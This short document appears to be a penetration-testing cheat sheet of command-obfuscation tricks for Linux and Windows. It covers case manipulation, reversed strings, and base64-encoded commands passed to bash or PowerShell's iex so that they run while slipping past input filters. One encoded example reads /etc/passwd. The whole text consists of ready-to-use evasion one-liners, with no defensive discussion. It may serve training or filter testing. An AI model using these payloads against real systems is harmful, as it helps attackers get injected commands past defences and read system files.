## Case Manipulation

#### Windows
```powershell-session
WhOaMi
```

#### Linux
```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
or
```bash
$(a="WhOaMi";printf %s "${a,,}")
```
or many other ways

## Reversed Commands

#### Linux
```shell-session
echo 'whoami' | rev

$(rev<<<'imaohw')
```

#### Windows
```powershell-session
"whoami"[-1..-20] -join ''

iex "$('imaohw'[-1..-20] -join '')"
```

## Encoded Commands

#### Linux
```shell-session
echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

#### Windows
```powershell-session
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA

iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
